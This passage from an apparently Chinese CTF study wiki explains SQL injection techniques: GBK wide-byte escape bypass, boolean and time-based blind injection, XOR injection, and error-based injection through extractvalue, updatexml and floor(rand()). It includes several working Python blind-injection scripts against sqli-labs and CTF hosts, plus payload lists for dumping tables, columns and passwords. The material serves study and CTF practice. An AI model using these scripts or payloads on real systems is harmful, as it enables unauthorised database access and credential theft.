URL\u89e3\u7801\u540e\u4e3a0xd50x27\uff0c\u518d\u7ecfPHP\u8f6c\u4e49\u540e\u4e3a0xd50x5c0x27\uff0c\u5373\u5c31\u662f\u57280x27(\u2018)\u4e4b\u524d\u63d2\u5165\u4e86\u8f6c\u4e49\u7b260x5c\uff08\\\uff09\u3002\u5f53MySQL\u91c7\u7528GBK\u7f16\u7801\u8fde \u63a5\u65f6\uff0c0xd50x5c0x27\u8fd9\u4e00\u5b57\u8282\u5e8f\u5217\u5c31\u88abMySQL\u4f5c\u4e3aGBK\u7f16\u7801\u7406\u89e3\uff1a\u8aa0\u2019\u3002</p> <p>\u8fd9\u6837\u5c31\u5403\u6389\u4e86PHP\u7684\u8f6c\u4e49\u7b26\uff0c\u4ece\u800c\u7a81\u7834\u4e86\u5355\u5f15\u53f7\u8f6c\u4e49\u7684\u9650\u5236\u3002</p> <p>\u8fc7\u6ee4 ' \u7684\u65f6\u5019\u5f80\u5f80\u5229\u7528\u7684\u601d\u8def\u662f\u5c06 '\u8f6c\u6362\u4e3a \\' \u3002</p> <p>\u5728 mysql \u4e2d\u4f7f\u7528 GBK \u7f16\u7801\u7684\u65f6\u5019\uff0c\u4f1a\u8ba4\u4e3a\u4e24\u4e2a\u5b57\u7b26\u4e3a\u4e00\u4e2a\u6c49\u5b57\uff0c\u4e00\u822c\u6709\u4e24\u79cd\u601d\u8def\uff1a</p> <p>\uff081\uff09%df \u5403\u6389  \u5177\u4f53\u7684\u65b9\u6cd5\u662f urlencode(') = %5c%27\uff0c\u6211\u4eec\u5728 %5c%27 \u524d\u9762\u6dfb\u52a0 %df \uff0c\u5f62\u6210%df%5c%27 \uff0c\u800c mysql \u5728 GBK \u7f16\u7801\u65b9\u5f0f\u7684\u65f6\u5019\u4f1a\u5c06\u4e24\u4e2a\u5b57\u8282\u5f53\u505a\u4e00\u4e2a\u6c49\u5b57\uff0c%df%5c \u5c31\u662f\u4e00\u4e2a\u6c49\u5b57\uff0c%27 \u4f5c\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684\uff08'\uff09\u7b26\u53f7\u5728\u5916\u9762\uff1a</p> <p>id=-1%df%27union select 1,user(),3--+</p> <p>\uff082\uff09\u5c06 \\' \u4e2d\u7684  \u8fc7\u6ee4\u6389\uff0c\u4f8b\u5982\u53ef\u4ee5\u6784\u9020 %**%5c%5c%27 \uff0c\u540e\u9762\u7684 %5c \u4f1a\u88ab\u524d\u9762\u7684 %5c \u6ce8\u91ca\u6389\u3002</p> <p>\u4e00\u822c\u4ea7\u751f\u5bbd\u5b57\u8282\u6ce8\u5165\u7684PHP\u51fd\u6570\uff1a</p> <p>1.replace\uff08\uff09\uff1a\u8fc7\u6ee4 '  \uff0c\u5c06 ' \u8f6c\u5316\u4e3a \\' \uff0c\u5c06  \u8f6c\u4e3a \\\uff0c\u5c06 \" \u8f6c\u4e3a \\\" \u3002\u7528\u601d\u8def\u4e00\u3002</p> <p>2.addslaches()\uff1a\u8fd4\u56de\u5728\u9884\u5b9a\u4e49\u5b57\u7b26\u4e4b\u524d\u6dfb\u52a0\u53cd\u659c\u6760\uff08\\\uff09\u7684\u5b57\u7b26\u4e32\u3002\u9884\u5b9a\u4e49\u5b57\u7b26\uff1a' , \" ,  \u3002\u7528\u601d\u8def\u4e00</p> <p>3..mysql_real_escape_string()\uff1a\u8f6c\u4e49\u4e0b\u5217\u5b57\u7b26\uff1a</p> <p>\\x00    \\n     \\r         '     \"     \\x1a</p>"},{"location":"web/sql/SQL_Injection/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/","title":"\u5e03\u5c14\u76f2\u6ce8","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5e03\u5c14\u76f2\u6ce8\uff0c\u6545\u540d\u601d\u610f\uff0c\u4e0ebool\u4ee3\u6570\u7684\u8fd0\u7b97\u6709\u5173\uff0c\u4e5f\u5c31\u662f\u548ctrue\u548cfalse\u6709\u5173</p> <p>\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7ed9\u6211\u4eec\u7684\u54cd\u5e94\uff0c\u751f\u6d3b\u4e2d\u8fd9\u4e2a\u6f0f\u6d1e\u76f8\u5bf9\u6765\u8bf4\u8fd8\u662f\u6bd4\u8f83\u591a\u3002</p> <p>\u5177\u4f53\u6765\u8bf4\u5c31\u662f\u6211\u4eec\u95ee\u670d\u52a1\u5668XXX\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u4e0d\u662fa\u4ed6\u544a\u8bc9\u4f60\u4e0d\u662f\uff0c\u7136\u540e\u4f60\u95ee\u5b83\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u4e0d\u662fb..................................\u4e00\u76f4\u63a8\u4e0b\u53bb\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u4e00\u4e2a\u5b57\u7b26\u7206\u7834\u51fa\u4f60\u60f3\u67e5\u8be2\u7684\u4fe1\u606f\u3002</p> <p>\u4e3b\u8981\u9760\u7684\u8fd8\u662f\u624e\u5b9e\u7684py\u811a\u672c\u529f\u592b</p> <p>bool\u76f2\u6ce8\u4f9d\u8d56\u4e8e\u811a\u672c\uff0c\u8fd9\u91cc\u7ed9\u51fa\u51e0\u4e2abool\u76f2\u6ce8\u7684\u811a\u672c</p> <p>\u8fd9\u91cc\u90fd\u662f\u4e8c\u5206\u6cd5\uff0c\u904d\u5386\u4e5f\u884c\uff0c\u4f46\u5927\u5bb6\u90fd\u5b66\u8fc7\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u5bf9\u5427\u3002</p> <pre><code>import requests\nimport time\nurl = \"\"\nfiles = {\"file\": \"123456789\"}\n'''\u5b57\u6bb5\u503c'''\nflag=''\nfor i in range(1,100):\nlow = 32\nhigh = 128\nmid = (low+high)//2\nwhile (low &lt; high):\ntime.sleep(0.06)\npayload_flag = {\n'username': \"test\\\" or (ascii(substr((select secret from flag_tbl),{0},1))&gt;{1}) #\".format(i,mid),'password': 'test'}\nr = requests.post(url=url,params=payload_flag,files=files, data={\"PHP_SESSION_UPLOAD_PROGRESS\": \"123456789\"},\ncookies={\"PHPSESSID\": \"test1\"})\nprint(payload_flag)\nif '&lt;meta http-equiv=\"refresh\" content=\"0; url=?p=home\" /&gt;' in r.text:\nlow = mid +1\nelse:\nhigh = mid\nmid = (low + high) // 2\nif(mid==32 or mid == 132):\nbreak\nflag +=chr(mid)\nprint(flag)\nprint(flag)\nPlain Text\n</code></pre> <pre><code>import requests\nurltest=\"http://127.0.0.1/index.php?id=1' and ascii(substr((select user()),1,1))=114%23\" #\u9a8c\u8bc1\u9875\u9762\uff0c\u901a\u5e38\u4e3a\u6b63\u786e\u9875\u9762\nURL=requests.get(urltest)\nfor j in range(1,10):\nfor i in range(33,125):\ni=str(i)\nj=str(j)\nurl=\"http://127.0.0.1/index.php?id=1' and ascii(substr((select user()),\"+j+\",1))=\"+i+\"%23\" #\u6ce8\u5165\u7528\u4e8e\u6bd4\u5bf9\u7684URL\n#print url\nurl=requests.get(url)\nif url.text==URL.text:\nprint chr(int(i))\n---------------------------------------------------\nimport requests\ndef database_len():\nfor i in range(1,10):\nurl = '''http://127.0.0.1/sqli-labs-master/Less-8/index.php'''\npayload = '''?id=1' and length(database())&gt;%s''' %i\n# print(url+payload+'%23')\nr = requests.get(url+payload+'%23')\nif 'You are in' in r.text:\nprint(i)\n\nelse:\n#print('false')\nprint('database_length:',i)\nbreak\ndatabase_len()\n\ndef database_name():\nname = ''\nfor j in range(1,9):\nfor i in 'sqcwertyuioplkjhgfdazxvbnm':\nurl = \"http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and substr(database(),%d,1)='%s'\" %(j,i)\n# print(url+'%23')\nr = requests.get(url+'%23')\nif 'You are in' in r.text:\nname = name+i\n\nprint(name)\n\nbreak\nprint('database_name:',name)\n\n\n\ndatabase_name()\nPlain Text\n</code></pre> <pre><code>import time\nimport requests\nurl = \"\"\nresult = ''\ni = 0\nwhile True:\ni = i + 1\nhead = 32\ntail = 127\nwhile head &lt; tail:\nmid = (head + tail) &gt;&gt; 1\n# payload = '(ascii(substr(database(),%d,1))&gt;%d)' % (i, mid)\n# payload = f'(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))&gt;{mid})'\n# payload = f'(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\"F1naI1y\")),{i},1))&gt;{mid})'\npayload = f'(ascii(substr((select(group_concat(password))from(F1naI1y)),{i},1))&gt;{mid})'\nr = requests.get(url + payload)\n# print(r.text)\ntime.sleep(0.1)\nif \"Click\" in r.text:\nhead = mid + 1\nelse:\ntail = mid\nif head != 32:\nresult += chr(head)\nelse:\nbreak\nprint(result)\nPlain Text\n</code></pre> <pre><code>import requests\nimport time\n# url\u662f\u968f\u65f6\u66f4\u65b0\u7684\uff0c\u5177\u4f53\u7684\u4ee5\u505a\u9898\u65f6\u5019\u7684\u4e3a\u51c6\nurl = 'http://8d08c7b6-e6f3-4df0-b71c-a2a397891bab.node3.buuoj.cn/search.php?id='\ni = 0\nflag = ''\nwhile True:\ni += 1\n# \u4ece\u53ef\u6253\u5370\u5b57\u7b26\u5f00\u59cb\nbegin = 32\nend = 126\ntmp = (begin + end) // 2\nwhile begin &lt; end:\nprint(begin, tmp, end)\ntime.sleep(0.1)\n# \u7206\u6570\u636e\u5e93\n# payload = \"''or(ascii(substr(database(),%d,1))&gt;%d)\" % (i, tmp)\n# \u7206\u8868\n# payload = \"''or(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),%d,1))&gt;%d)\" % (i, tmp)\n# \u7206\u5b57\u6bb5\n# payload = \"''or(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME='F1naI1y')),%d,1))&gt;%d)\" % (i, tmp)\n# \u7206flag \u8981\u8dd1\u5f88\u4e45\n# payload = \"''or(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)\" % (i, tmp)\n# \u7206flag \u5f88\u5feb\npayload = \"''or(ascii(substr((select(password)from(F1naI1y)where(username='flag')),%d,1))&gt;%d)\" % (i, tmp)\n# \u9519\u8bef\u793a\u4f8b\n# payload = \"''or(ascii(substr((select(GROUP_CONCAT(fl4gawsl))from(Flaaaaag)),%d,1))&gt;%d)\" % (i, tmp)\nr = requests.get(url+payload)\nif 'Click' in r.text:\nbegin = tmp + 1\ntmp = (begin + end) // 2\nelse:\nend = tmp\ntmp = (begin + end) // 2\nflag += chr(tmp)\nprint(flag)\nif begin == 32:\nbreak\nPlain Text\n</code></pre> <p>\u56e0\u4e3abool\u76f2\u6ce8\u7684\u4f4d\u7f6e\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u6709\u53ef\u80fd\u662f\u5728url\u4e2d\u4ee5get\u5f62\u5f0f\uff0c\u6216\u8005POST\u51fa\u7684\u6570\u636e\u7b49\u7b49\u6240\u4ee5\u6a21\u677f\u5f62\u5f0f\u4e5f\u4e0d\u552f\u4e00\uff0c\u4e0d\u8fc7\u53ea\u8981\u638c\u63e1requests\u5305\uff08\u7c7b\u4f3c\u5b66pwn\u7684\u90fd\u4f1a\u7528\u5230\u7684pwn\uff09\uff0c\u7406\u89e3\u53d1\u9001http\u7684\u6d41\u7a0b\uff0c\u5c31\u662f\u5728\u6a21\u677f\u4e0a\u8fdb\u884c\u4fee\u6539\u7684\u64cd\u4f5c\u4e86\u3002</p>"},{"location":"web/sql/SQL_Injection/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/#_2","title":"\u65f6\u95f4\u76f2\u6ce8","text":"<p>\u539f\u7406\u548cbool\u76f2\u6ce8\u4e00\u6a21\u4e00\u6837</p> <p>\u533a\u522b\u70b9\u5728\u4e8ebool\u5224\u65ad\u503c\u53d8\u6210\u4e86\u65f6\u95f4</p> <p>\u4e5f\u5c31\u662f\u8bf4\u5982\u679cbool\u4e3atrue,\u8fd4\u56de\u7684\u65f6\u95f4\u4e3a0.1s</p> <p>\u5982\u679c\u4e3afalse\uff0c\u8fd4\u56de\u7684\u65f6\u95f4\u4e3a1s</p> <p>\u8fd9\u4e0d\u5c31\u662f\u4e2a\u5bf9\u9519\u4e86\u561b</p> <p>\u6240\u4ee5\u76f4\u63a5\u5c31\u7ed9\u51fa\u811a\u672c\u4e86</p> <pre><code>import requests\nurl=\"http://fe5d8a13-c089-4e47-847d-b43c1622a20d.node3.buuoj.cn/index.php?action=publish\"\ncookie = {\"PHPSESSID\":\"silql33d2jbdqnqp0l6san8rr4\"}\nk=\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\nflag=\"\"\nfor i in range(50):\nfor j in k:\nj = ord(j)\ndata={\n'mood':'0',\n'signature':'1`,if(ascii(substr((select password from ctf_users where username=`admin`),{},1))={},sleep(3),0))#'.format(i,j)\n}\ntry:\nr=requests.post(url,data=data,cookies=cookie,timeout=(2,2))\nexcept:\nflag+=chr(j)\nprint(flag)\nbreak\nPlain Text\n</code></pre> <p>\u867d\u7136\u9488\u5bf9\u7279\u522b\u7684\u9898\u76ee\uff0c\u4f46\u662f\u6539\u4e00\u6539\u5c31\u80fd\u7528\u4e86\uff0c\u751a\u81f3\u4e5f\u80fd\u591f\u6539\u9020\u6210bool\u76f2\u6ce8\u7684\u811a\u672c\u3002</p> <p>\u627e\u4e0d\u5230\u5f53\u65f6\u7684\u4f8b\u9898\u4e86</p>"},{"location":"web/sql/SQL_Injection/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/#_3","title":"\u5f02\u6216\u6ce8\u5165","text":"<p>\u5f02\u6216\u6ce8\u5165\u5f0f\u4e00\u79cd\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u66f4\u50cf\u662f\u4e00\u79cd\u601d\u7ef4</p> <p>\u5728\u8ba1\u7b97\u673a\u4e8c\u8fdb\u5236</p> <p>1^1=0</p> <p>1^0=1</p> <p>0^1=1</p> <p>0^0=0</p> <p>\u7136\u540e\u80fd\u5e72\u5565\u5462\uff1f</p> <p>\u8003\u8651\u8fd9\u6837\u7684sql\u8bed\u53e5</p> <pre><code>id=1^(ascii(substr((select(database())),%d,1))&lt;%d)^1\" % (i,mid)\nPlain Text\n</code></pre> <p>\u8fd9\u662f\u4e00\u6761python\u8bed\u53e5\uff0c\u770b\u7684\u5230\u7684\u662f\u5f02\u6216\u3002</p> <p>\u7136\u540e\u4e2d\u95f4\u7684(ascii(substr((select(database())),%d,1))&lt;%d)\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f</p> <p>\u8fd4\u56de\u7684\u662ftrue\u6216false\uff0c\u5728\u8ba1\u7b97\u673a\u4e2d\u53ef\u4ee5\u770b\u6210\u662f1\u548c0</p> <p>\u7136\u540e\u4ed4\u7ec6\u770b\u6267\u884c\u7684sql\u8bed\u53e5\u53d61\u4e2a\u5b57\u7b26\u8f6c\u6362\u4e3aascii\u7801\u548c\u4e00\u4e2a\u6570\u5b57\u505a\u6bd4\u8f83\uff0c\u5f97\u52301\u62160\uff0c\u518d\u5f02\u6216.</p> <p>\u6700\u7ec8id=1\u62160</p> <p>\u5047\u5982\u6b64\u65f6\u5f53id=1\u65f6\u56de\u663e\u6b63\u5e38\uff0c\u4e3a0\u65f6\u56de\u663e\u9519\u8bef\uff0c\u6211\u4eec\u5c31\u6709\u4e86\u4e00\u4e2a\u5b89\u5168\u53ef\u9760\u7684\u6bd4\u8f83\u5668\u3002</p> <p>\u8fd9\u91cc\u5176\u5b9e\u662fbool\u76f2\u6ce8\u7684\u59ff\u52bf\u3002</p> <p>\u5176\u5b9e\u8fd9\u6837\u5f02\u6216\u7684\u601d\u60f3\u5728\u5f88\u591a\u5730\u65b9\u90fd\u5b58\u5728\uff1a</p> <p>\u751a\u81f3\u8fc7\u6ee4\u4e86\u6570\u5b57\u5b57\u6bcd</p> <p>\u6211\u4eec\u53ef\u4ee5\u7528\u4e24\u4e2a\u6c49\u5b57\u5f02\u6216\u6765\u8fdb\u884c\u6ce8\u5165\u3002</p>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","title":"\u62a5\u9519\u6ce8\u5165","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5f88\u91cd\u8981\uff0c\u800c\u4e14\u539f\u7406\u4e0a\u6211\u89c9\u5f97\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u96be\u7406\u89e3\u3002</p> <p>\u5f53\u7136\u7528\u8d77\u6765\u7531\u4e8e\u6bd4\u8f83\u56fa\u5b9a\uff0c\u62ff\u7740\u73b0\u6210\u7684payload\u6162\u6162\u53bb\u6539\u5c31\u884c\u4e86</p> <p>\u62a5\u9519\u6ce8\u5165\u5728\u6ca1\u6cd5\u7528union\u8054\u5408\u67e5\u8be2\u65f6\u7528\uff0c\u4f46\u524d\u63d0\u8fd8\u662f\u4e0d\u80fd\u8fc7\u6ee4\u4e00\u4e9b\u5173\u952e\u7684\u51fd\u6570\u3002</p> <p>\u62a5\u9519\u6ce8\u5165\u5c31\u662f\u5229\u7528\u4e86\u6570\u636e\u5e93\u7684\u67d0\u4e9b\u673a\u5236\uff0c\u4eba\u4e3a\u5730\u5236\u9020\u9519\u8bef\u6761\u4ef6\uff0c\u4f7f\u5f97\u67e5\u8be2\u7ed3\u679c\u80fd\u591f\u51fa\u73b0\u5728\u9519\u8bef\u4fe1\u606f\u4e2d\u3002\u770b\u8fc7\u65e0\u5217\u540d\u6ce8\u5165\u90a3\u91ccjoin\u7684\u8bdd\uff0c\u6309\u9053\u7406\u6765\u8bf4\uff0c\u539f\u7406\u5dee\u4e0d\u591a\u3002</p>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#xpath","title":"xpath\u8bed\u6cd5\u9519\u8bef","text":"<p>\u5229\u7528xpath\u8bed\u6cd5\u9519\u8bef\u6765\u8fdb\u884c\u62a5\u9519\u6ce8\u5165\u4e3b\u8981\u5229\u7528<code>extractvalue</code>\u548c<code>updatexml</code>\u4e24\u4e2a\u51fd\u6570\u3002</p> <p>\u4f7f\u7528\u6761\u4ef6\uff1amysql\u7248\u672c&gt;5.1.5</p> <p>\u8fd9\u4e24\u4e2a\u51fd\u6570\u7528\u8d77\u6765\u662f\u6ca1\u4ec0\u4e48\u533a\u522b\u7684</p>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#extractvalue","title":"extractvalue\u51fd\u6570\uff1a","text":"<p>\u51fd\u6570\u539f\u578b\uff1aextractvalue(xml_document,Xpath_string)</p> <ul> <li> <p>\u6b63\u5e38\u8bed\u6cd5\uff1aextractvalue(xml_document,Xpath_string);</p> </li> <li> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1axml_document\u662fstring\u683c\u5f0f\uff0c\u4e3axml\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0</p> </li> <li> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1aXpath_string\u662fxpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32</p> </li> <li> <p>\u4f5c\u7528\uff1a\u4ece\u76ee\u6807xml\u4e2d\u8fd4\u56de\u5305\u542b\u6240\u67e5\u8be2\u503c\u7684\u5b57\u7b26\u4e32</p> </li> <li> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8981\u6c42\u7b26\u5408xpath\u8bed\u6cd5\u7684\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u4e0d\u6ee1\u8db3\u8981\u6c42\uff0c\u5219\u4f1a\u62a5\u9519\uff0c\u5e76\u4e14\u5c06\u67e5\u8be2\u7ed3\u679c\u653e\u5728\u62a5\u9519\u4fe1\u606f\u91cc\u3002</p> </li> </ul> <p>\u56e0\u6b64\u7ed9\u51fa\u62a5\u9519\u5229\u7528\u7684payload:\uff08\u767d\u5ad6\u515a\uff09</p> <pre><code>id='and(select extractvalue(\"anything\",concat('~',(select\u8bed\u53e5))))\nid='and(select extractvalue(1,concat('~',(select database()))))\nid='and(select extractvalue(1,concat(0x7e,@@version)))\u67e5\u6570\u636e\u5e93\u540d\uff1aid='and(select extractvalue(1,concat(0x7e,(select database()))))\u7206\u8868\u540d\uff1aid='and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))\u7206\u5b57\u6bb5\u540d\uff1aid='and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"TABLE_NAME\"))))\u7206\u6570\u636e\uff1aid='and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))\nPlain Text\n</code></pre> <p>\u6ce8\u91ca\uff1a</p> <p>\u2460 0x7e=\u2019~\u2019</p> <p>\u2461concat(\u2018a\u2019,\u2018b\u2019)=\u201cab\u201d</p> <p>\u2462version()=@@version</p> <p>\u2463 \u2018~\u2018\u53ef\u4ee5\u6362\u6210\u2019#\u2019\u3001\u2019$'\u7b49\u4e0d\u6ee1\u8db3xpath\u683c\u5f0f\u7684\u5b57\u7b26</p> <p>\u2464extractvalue()\u80fd\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u6700\u5927\u957f\u5ea6\u4e3a32\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u7684\u7ed3\u679c\u8d85\u8fc732\uff0c\u5c31\u8981\u7528substring()\u51fd\u6570\u622a\u53d6\u6216limit\u5206\u9875\uff0c\u4e00\u6b21\u67e5\u770b\u6700\u591a32\u4f4d\u3002\u8fd8\u6709\u7684\u59ff\u52bf\u7684\u8bdd\uff1a\u5229\u7528reverse\u9006\u5411\u8f93\u51fa\u7136\u540e\u81ea\u5df1\u624b\u52a8\u91cd\u5199\u4e00\u4e0b\u4e5f\u662f\u4e00\u79cd\u59ff\u52bf</p>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#updatexml","title":"updatexml","text":"<p>\u51fd\u6570\u539f\u578b\uff1aupdatexml(xml_document,xpath_string,new_value)</p> <ul> <li> <p>\u6b63\u5e38\u8bed\u6cd5\uff1aupdatexml(xml_document,xpath_string,new_value)</p> </li> <li> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1axml_document\u662fstring\u683c\u5f0f\uff0c\u4e3axml\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0 \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1axpath_string\u662fxpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32</p> </li> <li> <p>\u7b2c\u4e09\u4e2a\u53c2\u6570\uff1anew_value\u662fstring\u683c\u5f0f\uff0c\u66ff\u6362\u67e5\u627e\u5230\u7684\u8d1f\u8377\u6761\u4ef6\u7684\u6570\u636e \u4f5c\u7528\uff1a\u6539\u53d8\u6587\u6863\u4e2d\u7b26\u5408\u6761\u4ef6\u7684\u8282\u70b9\u7684\u503c</p> </li> <li> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8ddfextractvalue\u51fd\u6570\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e00\u6837\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u5229\u7528\uff0c\u4e14\u5229\u7528\u65b9\u5f0f\u76f8\u540c</p> </li> <li></li> </ul> <pre><code>id='and(selectupdatexml(\"anything\",concat('~',(select\u8bed\u53e5())),\"anything\"))'and(selectupdatexml(1,concat('~',(select database())),1))'and(selectupdatexml(1,concat(0x7e,@@database),1))\u7206\u6570\u636e\u5e93\u540d\uff1a'and(select updatexml(1,concat(0x7e,(select database())),0x7e))\u7206\u8868\u540d\uff1a'and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))\u7206\u5217\u540d\uff1a'and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\"TABLE_NAME\")),0x7e))\u7206\u6570\u636e\uff1a'and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))\nPlain Text\n</code></pre> <p>\u5f62\u5f0f\u7c7b\u4f3c\u5982\u4e0b</p> <p></p> <p>\u62a5\u9519\u5e26\u51fa\u4e86\u5e93\u540d</p> <p>\u78b0\u5230\u9898\u76ee\u4e00\u822c\u548cbool\u76f2\u6ce8\u548c\u65f6\u95f4\u76f2\u6ce8\u653e\u4e00\u8d77\u6765</p> <p>\u4f8b\u9898\uff1a[CISCN2019 \u534e\u5317\u8d5b\u533a Day1 Web5]CyberPunk</p> <p>\uff08\u8fd9\u9898\u8fd8\u6709\u4e8c\u6b21\u6ce8\u5165\uff09</p>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#_2","title":"\u4e3b\u952e\u91cd\u590d","text":"<p>\u5168\u79f0\u662f\uff1aconcat+rand()+group_by()\u5bfc\u81f4\u4e3b\u952e\u91cd\u590d</p> <p>\u793a\u4f8b\u5728\u4e0b\u9762</p> <p>\u8fd9\u79cd\u62a5\u9519\u65b9\u6cd5\u7684\u672c\u8d28\u662f\u56e0\u4e3afloor(rand(0)*2)\u7684\u91cd\u590d\u6027\uff0c\u5bfc\u81f4group by\u8bed\u53e5\u51fa\u9519\u3002group by key\u7684\u539f\u7406\u662f\u5faa\u73af\u8bfb\u53d6\u6570\u636e\u7684\u6bcf\u4e00\u884c\uff0c\u5c06\u7ed3\u679c\u4fdd\u5b58\u4e8e\u4e34\u65f6\u8868\u4e2d\u3002\u8bfb\u53d6\u6bcf\u4e00\u884c\u7684key\u65f6\uff0c\u5982\u679ckey\u5b58\u5728\u4e8e\u4e34\u65f6\u8868\u4e2d\uff0c\u5219\u4e0d\u5728\u4e34\u65f6\u8868\u4e2d\u66f4\u65b0\u4e34\u65f6\u8868\u7684\u6570\u636e\uff1b\u5982\u679ckey\u4e0d\u5728\u4e34\u65f6\u8868\u4e2d\uff0c\u5219\u5728\u4e34\u65f6\u8868\u4e2d\u63d2\u5165key\u6240\u5728\u884c\u7684\u6570\u636e\u3002</p> <p>floor\u51fd\u6570\u7684\u4f5c\u7528\u662f\u8fd4\u56de\u5c0f\u4e8e\u7b49\u4e8e\u8be5\u503c\u7684\u6700\u5927\u6574\u6570,\u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3a\u5411\u4e0b\u53d6\u6574\uff0c\u53ea\u4fdd\u7559\u6574\u6570\u90e8\u5206\u3002</p> <p>rand()\u51fd\u6570\u53ef\u4ee5\u7528\u6765\u751f\u62100\u62161\uff0c\u4f46\u662frand(0)\u548crand()\u8fd8\u662f\u6709\u672c\u8d28\u533a\u522b\u7684\uff0crand(0)\u76f8\u5f53\u4e8e\u7ed9rand()\u51fd\u6570\u4f20\u9012\u4e86\u4e00\u4e2a\u53c2\u6570\uff0c\u7136\u540erand()\u51fd\u6570\u4f1a\u6839\u636e0\u8fd9\u4e2a\u53c2\u6570\u8fdb\u884c\u968f\u673a\u6570\u6210\u6210\u3002rand()\u751f\u6210\u7684\u6570\u5b57\u662f\u5b8c\u5168\u968f\u673a\u7684\uff0c\u800crand(0)\u662f\u6709\u89c4\u5f8b\u7684\u751f\u6210\uff0c\u5f88\u663e\u7136rand(0)\u662f\u4f2a\u968f\u673a\u7684\uff0c\u6709\u89c4\u5f8b\u53ef\u5faa\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u91c7\u7528rand(0)\u8fdb\u884c\u62a5\u9519\u6ce8\u5165\u7684\u539f\u56e0\uff0crand(0)\u662f\u7a33\u5b9a\u7684\uff0c\u8fd9\u6837\u6bcf\u6b21\u6ce8\u5165\u90fd\u4f1a\u62a5\u9519</p> <p>(\u4e3e\u4e2a\u4f8b\u5b50\u7406\u89e3\uff1a\u5f53\u521d\u5b66C\u8bed\u8a00\u7684\u65f6\u5019\u7684\u90a3\u4e2asrand\u8bbe\u7acb\u968f\u673a\u6570\u79cd\u5b50\u4e00\u822c\u4f1a\u7528time\u7684\u539f\u56e0\u662f\u4ec0\u4e48\uff1f\u6ca1\u9519\uff0c\u56e0\u4e3a\u5982\u679c\u968f\u673a\u6570\u8868\u91cc\u9762\u7684\u968f\u673a\u6570\u79cd\u5b50\u4e0d\u53d1\u751f\u6539\u53d8\u7684\u8bdd\uff0c\u51fd\u6570\u6bcf\u6b21\u91cd\u65b0\u8fd0\u884c\u90fd\u4f1a\u51fa\u73b0\u4e00\u6837\u7684\u7ed3\u679c\u3002)</p> <p>\u6211\u4eec\u4f7f\u7528group by\u8fdb\u884c\u5206\u7ec4\u67e5\u8be2\u7684\u65f6\u5019\uff0c\u6570\u636e\u5e93\u4f1a\u751f\u6210\u4e00\u5f20\u865a\u62df\u8868</p> 